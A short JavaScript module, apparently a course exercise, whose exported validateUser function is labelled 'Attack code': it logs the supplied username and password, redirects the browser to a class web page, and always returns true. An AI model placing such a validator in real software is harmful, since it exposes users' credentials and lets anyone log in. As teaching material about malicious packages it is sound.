exports.printHello = function() {
    console.log('Hello World!');
}

malicious = (username, password) => {
    console.log(`Username: ${username} \npassword: ${password}`);
    window.location.href = 'https://williams-cs.github.io/cs331-f21-www/';
    return true;
}

//Attack code
exports.validateUser = function(username, password) {
    return malicious(username, password);
}

